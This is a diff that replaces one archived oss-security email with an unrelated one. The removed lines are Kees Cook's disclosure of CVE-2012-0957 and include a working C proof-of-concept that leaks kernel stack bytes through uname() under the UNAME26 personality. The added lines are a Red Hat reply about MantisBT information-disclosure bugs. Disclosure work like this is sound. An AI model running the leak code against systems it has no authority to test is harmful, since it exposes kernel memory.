@@ -1,87 +1,63 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/10/09/4
-Message-ID: <20121009201034.GE24964@outflux.net>
-Date: Tue, 9 Oct 2012 13:10:34 -0700
-From: Kees Cook <keescook@...omium.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/11/13/13
+Message-ID: <50A290DF.9030701@redhat.com>
+Date: Tue, 13 Nov 2012 11:26:39 -0700
+From: Kurt Seiifried <kseifried@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: Linux kernel stack memory content leak via UNAME26
+Subject: Re: CVE request: mantis before 1.2.12
 Content-Type: text/plain; charset=utf-8
 
-CVE-2012-0957
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-Calling uname() with the UNAME26 personality set allows a leak of kernel
-stack contents.
+On 11/13/2012 07:52 AM, Hanno Böck wrote:
+> http://www.mantisbt.org/bugs/changelog_page.php?version_id=150
+> 
+> New mantis bugtracker release. Two fixes are security relevant 
+> (althouhg both sound minor)
 
-Fix:
+Just to confirm I understand these issues:
 
-https://lkml.org/lkml/2012/10/9/550
+> - 0014496: [security] Workflow Transitions: Minimal Access Level
+> to Change to this status has no correct 'default' (dregad) -
+> resolved. http://www.mantisbt.org/bugs/view.php?id=14496
 
-PoC:
+This is an information disclosure: "Consequently, saving the page
+without changes would cause the config to be saved with all access
+levels as 'viewer'."
 
+> - 0014704: [security] Clone and Move issue with Copy bug notes -
+> user get email notice from project without access (dregad) -
+> closed. http://www.mantisbt.org/bugs/view.php?id=14704
 
-/* Test for UNAME26 personality uname kernel stack leak.
- * Copyright 2012, Kees Cook <keescook@...omium.org>
- * License: GPLv3
- */
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <errno.h>
-#include <unistd.h>
-#include <sys/personality.h>
-#include <sys/utsname.h>
+Also an information disclosure: Now any action on IssueB eg. add
+notes, change status causes send email notice to UserA from IssueB.
+UserA don't have access to IssueB by can read whole history and any
+notes from email body.
 
-#define UNAME26 0x0020000
-
-int dump_uts(void)
-{
-	int i, leaked = 0;
-	struct utsname buf = { };
-
-	if (uname(&buf)) {
-		perror("uname");
-		exit(1);
-	}
-	printf("%s\n", buf.release);
-
-	for (i = strlen(buf.release) + 1; i < sizeof(buf.release); i++) {
-		unsigned char c = (unsigned char)buf.release[i];
-
-		printf("%02x", c);
-		if (c)
-			leaked = 1;
-	}
-	printf("\n");
-
-	return leaked ? (i - (strlen(buf.release) + 1)) : 0;
-}
-
-int main(int ac, char **av)
-{
-	int leaked;
-
-	leaked = dump_uts();
-	if (leaked) {
-		printf("Leaked %d bytes even without UNAME26!?\n", leaked);
-		return 1;
-	}
+> Please assign CVEs.
 
 
-	if (personality(PER_LINUX | UNAME26) < 0) {
-		perror("personality");
-		exit(1);
-	}
 
-	leaked = dump_uts();
-	if (leaked) {
-		printf("Leaked %d bytes!\n", leaked);
-		return 1;
-	} else {
-		printf("Seems safe.\n");
-		return 0;
-	}
-}
 
--- 
-Kees Cook
-Chrome OS Security
+- -- 
+Kurt Seifried Red Hat Security Response Team (SRT)
+PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.12 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://www.enigmail.net/
+
+iQIcBAEBAgAGBQJQopDeAAoJEBYNRVNeJnmTqjkQAKExE/IU6vY0WMd4LhD8CgYx
+22caC6AeEHHHH0RZqPENosv94iMGgUlSuaHDEO1qNzWUwhCvP/gbP9JmOuKJ2dXh
+uHg4y4l8kpDrdC6GHGTCIYmCh+Y+Xu4+ZnVlSdrb8cw/GB1YdekMD/oaHt5eOfox
+0cQ2HIN/4+deM0NRsomK+mTmZgajcsv1WTshhWPq8TsuZe8JdRr725A8vMTwRXa+
+utKwdli/kCRmFTonbIZprnnNVrGRa0WctDZ8Tif3nBPyAD5SM1RFuKbvBH75D2aA
+xBagPxeQe/A2y2eBuzfrKdnIMnTZqcz42zPirnjCTydOX1dzMc24FSObsnzxLk86
+vJK8hZlVnrFHL995i/1CC4P6IRx3FdKymNbXv7qYxf+UKImN/+uuwPLQYh575Tu3
+ilf/yUKrrJgzS3qBZm67944Yv6tKMMZI0elwZ8KkXC4m7IjJG34f0BCBjZU4+34B
+EMguOYUXoHca7X1ViG6mC2HLMibF6gOXPYx5aEvLnpDwj4GUMskOE7IYCjFL9PaJ
+aPh2ZsFeRw++289eI9OEA5iNOJkSCI+g6Cy52KLwB/6XpKyR8gzISq1oYCA1dxDU
+Lrk31W+Y2bq83B7+cfN7+Uuu1VKQACsN96Uf/y53RccsZ+fYj/gKjom8c2PHd0D9
++wvcShflrjTOX8bfbbcg
+=pMX1
+-----END PGP SIGNATURE-----
